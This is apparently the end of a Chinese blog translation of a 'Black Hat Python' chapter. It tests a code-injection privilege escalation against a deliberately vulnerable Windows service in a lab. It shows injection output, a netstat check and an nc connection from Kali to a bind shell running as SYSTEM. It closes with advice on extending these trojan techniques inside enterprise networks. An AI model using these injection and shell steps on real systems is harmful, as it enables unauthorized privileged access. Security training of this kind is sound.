<h3 id="Kicking-the-Tires-2"><a href="#Kicking-the-Tires-2" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>如果您在本章开头安装了 <em>bhservice</em> ，您可以轻松地测试您的新代码注入程序。确保服务正在运行，然后执行  <em>file_monitor.py</em> 脚本。最终，您将看到输出表明已经创建和修改了一个 <em>.vbs</em> 文件，并且代码已经被注入。在下面的示例中，我们注释掉了内容的打印以节省空间：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Modified c:\Windows\Temp\bhservice_task.vbs</span><br><span class="line">[vvv] Dumping contents ...</span><br><span class="line">\o/ Injected Code</span><br><span class="line">[^^^] Dump complete.</span><br></pre></td></tr></table></figure>

<p>如果打开一个新的 cmd 窗口，您应该看到目标端口已打开：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">netstat</span> -<span class="title">an</span> |<span class="title">findstr</span> 9999</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.1.208:9999     0.0.0.0:0              <span class="title">LISTENING</span></span></span><br></pre></td></tr></table></figure>

<p>如果一切顺利，您可以使用 <em>nc</em> 命令或运行第2章的 <em>netcat.py</em> 脚本来连接你刚刚生成的监听器。为了确保您的权限提升正常生效，请从您的 Kali 计算机连接到侦听器，并检查您正在作为哪个用户运行：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">208</span> <span class="number">9999</span></span><br><span class="line">Connection to 192.168.1.208 port 9999 [tcp/*] succeeded!</span><br><span class="line"> #&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"> #&gt; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<p>这应该可以表明你已经获得了“神圣的” <em>SYSTEM</em> 用户的特权。你的代码注入成功了。</p>
<p>在本章结束时，您可能会认为有些攻击有点深奥。但是如果你花足够的时间“进入”一个大企业网络里，你就会意识到这些策略是非常可行的。您可以轻松地扩展本章中的工具，或者将其转换为专业脚本，以破坏本地帐户或应用程序。 WMI 本身就是一个很好的本地侦察数据的资源；一旦你进入网络，它可以帮助你进一步攻击。特权提升对于任何好的特洛伊木马程序来说都是必不可少的。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-10/">https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-10/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/read.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-07/Black-Hat-Python-2nd-11/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 11</div></div></a></div><div class="next-post pull-right"><a href="/2021-07/Black-Hat-Python-2nd-9/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 9</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-9/" title="Black Hat Python 2nd 9"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-18</div><div class="relatedPosts_title">Black Hat Python 2nd 9</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-8/" title="Black Hat Python 2nd 8"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-13</div><div class="relatedPosts_title">Black Hat Python 2nd 8</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div><div class="relatedPosts_item"><a href="/2021-06/Black-Hat-Python-2nd-5/" title="Black Hat Python 2nd 5"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="relatedPosts_title">Black Hat Python 2nd 5</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>